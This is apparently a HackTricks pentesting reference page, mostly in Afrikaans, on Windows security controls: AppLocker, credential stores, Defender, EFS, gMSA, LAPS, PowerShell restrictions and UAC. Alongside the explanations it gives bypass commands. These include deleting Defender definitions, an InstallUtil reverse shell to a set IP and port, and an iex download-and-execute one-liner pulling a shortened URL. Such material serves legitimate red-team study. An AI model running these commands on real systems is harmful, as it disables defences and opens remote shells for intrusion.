# Windows Veiligheidsbeheer

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **werkvloei te outomatiseer** wat aangedryf word deur die wêreld se **meest gevorderde** gemeenskapstoestelle.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker Beleid

'n Aansoek witlys is 'n lys van goedgekeurde sagtewaretoepassings of uitvoerbare lêers wat toegelaat word om teenwoordig te wees en op 'n stelsel te loop. Die doel is om die omgewing te beskerm teen skadelike malware en ongekeurde sagteware wat nie ooreenstem met die spesifieke besigheidsbehoeftes van 'n organisasie nie.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft se **aansoek witlys oplossing** en gee stelselsadministrateurs beheer oor **watter aansoeke en lêers gebruikers kan uitvoer**. Dit bied **fynbeheer** oor uitvoerbare lêers, skripte, Windows-installer lêers, DLL's, verpakte toepassings, en verpakte toepassingsinstalleerders.\
Dit is algemeen dat organisasies **cmd.exe en PowerShell.exe** blokkeer en skrywe toegang tot sekere gidse, **maar dit kan alles omseil word**.

### Kontroleer

Kontroleer watter lêers/uitbreidings op die swartlys/witlys is:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Hierdie registerpad bevat die konfigurasies en beleide wat deur AppLocker toegepas word, wat 'n manier bied om die huidige stel reëls wat op die stelsel afgedwing word, te hersien:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Omseil

* Nuttige **Skryfbare mappen** om die AppLocker-beleid te omseil: As AppLocker toelaat om enigiets binne `C:\Windows\System32` of `C:\Windows` uit te voer, is daar **skryfbare mappen** wat jy kan gebruik om **dit te omseil**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Gewoonlik **vertroude** [**"LOLBAS's"**](https://lolbas-project.github.io/) binêre kan ook nuttig wees om AppLocker te omseil.
* **Sleg geskryfde reëls kan ook omseil word**
* Byvoorbeeld, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, jy kan 'n **gids genaamd `allowed`** enige plek skep en dit sal toegelaat word.
* Organisasies fokus ook dikwels op **die blokkering van die `%System32%\WindowsPowerShell\v1.0\powershell.exe` uitvoerbare**, maar vergeet van die **ander** [**PowerShell uitvoerbare plekke**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) soos `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` of `PowerShell_ISE.exe`.
* **DLL afdwinging baie selde geaktiveer** weens die ekstra las wat dit op 'n stelsel kan plaas, en die hoeveelheid toetsing wat benodig word om te verseker dat niks sal breek nie. So, die gebruik van **DLL's as agterdeure sal help om AppLocker te omseil**.
* Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell** kode in enige proses uit te voer en AppLocker te omseil. Vir meer inligting, kyk: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Kredensiaal Berging

### Sekuriteitsrekeningbestuurder (SAM)

Plaaslike kredensiale is teenwoordig in hierdie lêer, die wagwoorde is gehasht.

### Plaaslike Sekuriteitsowerheid (LSA) - LSASS

Die **kredensiale** (gehasht) word **gestoor** in die **geheue** van hierdie subsisteem vir Enkelteken-in redes.\
**LSA** bestuur die plaaslike **sekuriteitsbeleid** (wagwoordbeleid, gebruikersregte...), **verifikasie**, **toegangstokens**...\
LSA sal die een wees wat die **kredensiale** in die **SAM** lêer (vir 'n plaaslike aanmelding) sal **kontroleer** en met die **domeinbeheerder** sal **praat** om 'n domein gebruiker te verifieer.

Die **kredensiale** word **gestoor** binne die **proses LSASS**: Kerberos kaartjies, hashes NT en LM, maklik ontsleutelde wagwoorde.

### LSA geheime

LSA kan sekere kredensiale op skyf stoor:

* Wagwoord van die rekenaarrekening van die Aktiewe Gids (onbereikbare domeinbeheerder).
* Wagwoorde van die rekeninge van Windows dienste
* Wagwoorde vir geskeduleerde take
* Meer (wagwoord van IIS toepassings...)

### NTDS.dit

Dit is die databasis van die Aktiewe Gids. Dit is slegs teenwoordig in Domein Beheerders.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) is 'n Antivirus wat beskikbaar is in Windows 10 en Windows 11, en in weergawes van Windows Server. Dit **blokkeer** algemene pentesting gereedskap soos **`WinPEAS`**. Tog is daar maniere om **hierdie beskermings te omseil**.

### Kontrole

Om die **status** van **Defender** te kontroleer, kan jy die PS cmdlet **`Get-MpComputerStatus`** uitvoer (kontroleer die waarde van **`RealTimeProtectionEnabled`** om te weet of dit aktief is):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Om dit te enumerate kan jy ook uitvoer:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS beveilig lêers deur middel van versleuteling, wat 'n **simmetriese sleutel** gebruik wat bekend staan as die **Lêer Versleuteling Sleutel (FEK)**. Hierdie sleutel word versleuteld met die gebruiker se **publieke sleutel** en gestoor binne die versleutelde lêer se $EFS **alternatiewe datastroom**. Wanneer ontsleuteling nodig is, word die ooreenstemmende **privaat sleutel** van die gebruiker se digitale sertifikaat gebruik om die FEK uit die $EFS-stroom te ontsleutel. Meer besonderhede kan gevind word [hier](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

**Ontsleuteling scenario's sonder gebruiker inisiatief** sluit in:

* Wanneer lêers of vouers na 'n nie-EFS lêerstelsel, soos [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table), verskuif word, word hulle outomaties ontsleutel.
* Versleutelde lêers wat oor die netwerk via die SMB/CIFS-protokol gestuur word, word voor oordrag ontsleutel.

Hierdie versleutelingmetode stel **deursigtige toegang** tot versleutelde lêers vir die eienaar in staat. Dit is egter nie moontlik om die lêers te ontsleutel deur bloot die eienaar se wagwoord te verander en in te log nie.

**Belangrike Takeaways**:

* EFS gebruik 'n simmetriese FEK, versleuteld met die gebruiker se publieke sleutel.
* Ontsleuteling gebruik die gebruiker se privaat sleutel om toegang tot die FEK te verkry.
* Outomatiese ontsleuteling vind plaas onder spesifieke toestande, soos kopieer na FAT32 of netwerk oordrag.
* Versleutelde lêers is toeganklik vir die eienaar sonder addisionele stappe.

### Check EFS info

Kontroleer of 'n **gebruiker** hierdie **diens** gebruik het deur te kyk of hierdie pad bestaan:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Kontroleer **wie** toegang tot die lêer het met cipher /c \<file>\
Jy kan ook `cipher /e` en `cipher /d` binne 'n vouer gebruik om **te versleutel** en **te ontsleutel** al die lêers

### Decrypting EFS files

#### Being Authority System

Hierdie metode vereis dat die **slagoffer gebruiker** 'n **proses** binne die gasheer **uitvoer**. As dit die geval is, kan jy met 'n `meterpreter` sessie die token van die gebruiker se proses naboots (`impersonate_token` van `incognito`). Of jy kan net `migrate` na die gebruiker se proses.

#### Knowing the users password

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Group Managed Service Accounts (gMSA)

Microsoft het **Group Managed Service Accounts (gMSA)** ontwikkel om die bestuur van diensrekeninge in IT-infrastrukture te vereenvoudig. Anders as tradisionele diensrekeninge wat dikwels die "**Wagwoord verval nooit**" instelling geaktiveer het, bied gMSA's 'n veiliger en meer hanteerbare oplossing:

* **Outomatiese Wagwoordbestuur**: gMSA's gebruik 'n komplekse, 240-karakter wagwoord wat outomaties verander volgens domein of rekenaarbeleid. Hierdie proses word hanteer deur Microsoft se Sleutelverspreidingsdiens (KDC), wat die behoefte aan handmatige wagwoordopdaterings uitskakel.
* **Verbeterde Sekuriteit**: Hierdie rekeninge is immuun teen vergrendeling en kan nie vir interaktiewe aanmeldings gebruik word nie, wat hul sekuriteit verbeter.
* **Meervoudige Gasheerondersteuning**: gMSA's kan oor verskeie gasheers gedeel word, wat hulle ideaal maak vir dienste wat op verskeie bedieners loop.
* **Geskeduleerde Taakvermoë**: Anders as bestuurde diensrekeninge, ondersteun gMSA's die uitvoering van geskeduleerde take.
* **Vereenvoudigde SPN-bestuur**: Die stelsel werk outomaties die Diens Prinsipaal Naam (SPN) by wanneer daar veranderinge aan die rekenaar se sAMaccount besonderhede of DNS-naam is, wat SPN-bestuur vereenvoudig.

Die wagwoorde vir gMSA's word in die LDAP eienskap _**msDS-ManagedPassword**_ gestoor en word outomaties elke 30 dae deur Domein Beheerders (DC's) gereset. Hierdie wagwoord, 'n versleutelde datablad bekend as [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kan slegs deur gemagtigde administrateurs en die bedieners waarop die gMSA's geïnstalleer is, verkry word, wat 'n veilige omgewing verseker. Om toegang tot hierdie inligting te verkry, is 'n beveiligde verbinding soos LDAPS nodig, of die verbinding moet geverifieer word met 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../.gitbook/assets/asd1.png)

Jy kan hierdie wagwoord lees met [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Vind meer inligting in hierdie pos**](https://cube0x0.github.io/Relaying-for-gMSA/)

Kyk ook na hierdie [webblad](https://cube0x0.github.io/Relaying-for-gMSA/) oor hoe om 'n **NTLM relay aanval** uit te voer om die **wagwoord** van **gMSA** te **lees**.

## LAPS

Die **Local Administrator Password Solution (LAPS)**, beskikbaar vir aflaai van [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), stel die bestuur van plaaslike Administrateur wagwoorde in staat. Hierdie wagwoorde, wat **ewekansig**, uniek, en **gereeld verander** word, word sentraal in Active Directory gestoor. Toegang tot hierdie wagwoorde is beperk deur ACLs aan gemagtigde gebruikers. Met voldoende toestemmings gegee, word die vermoë om plaaslike admin wagwoorde te lees, verskaf.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Beperkte Taalmodus

PowerShell [**Beperkte Taalmodus**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **sluit baie van die funksies** wat nodig is om PowerShell effektief te gebruik, soos die blokkering van COM-objekte, slegs goedgekeurde .NET tipes, XAML-gebaseerde werksvloeie, PowerShell klasse, en meer, af.

### **Kontroleer**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Omseil
```powershell
#Easy bypass
Powershell -version 2
```
In huidige Windows sal daardie Bypass nie werk nie, maar jy kan [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) gebruik.\
**Om dit te kompileer mag jy** **moet** _**'n Verwysing Voeg**_ -> _Blader_ -> _Blader_ -> voeg `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` by en **verander die projek na .Net4.5**.

#### Direkte bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
U kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell** kode in enige proses uit te voer en die beperkte modus te omseil. Vir meer inligting, kyk: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS Uitvoeringsbeleid

Standaard is dit op **beperk** gestel. Hoofmaniere om hierdie beleid te omseil:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

Is die API wat gebruik kan word om gebruikers te autentiseer.

Die SSPI sal verantwoordelik wees vir die vind van die toepaslike protokol vir twee masjiene wat wil kommunikeer. Die verkieslike metode hiervoor is Kerberos. Dan sal die SSPI onderhandel oor watter autentifikasieprotokol gebruik sal word, hierdie autentifikasieprotokolle word Security Support Provider (SSP) genoem, is binne elke Windows-masjien in die vorm van 'n DLL geleë en beide masjiene moet dieselfde ondersteun om te kan kommunikeer.

### Main SSPs

* **Kerberos**: Die verkieslike een
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** en **NTLMv2**: Compatibiliteitsredes
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Webbedieners en LDAP, wagwoord in die vorm van 'n MD5-hash
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL en TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Dit word gebruik om die protokol te onderhandel wat gebruik moet word (Kerberos of NTLM, met Kerberos as die standaard)
* %windir%\Windows\System32\lsasrv.dll

#### Die onderhandeling kan verskeie metodes of slegs een bied.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n kenmerk wat 'n **toestemmingsprompt vir verhoogde aktiwiteite** moontlik maak.

{% content-ref url="uac-user-account-control.md" %}
[uac-user-account-control.md](uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
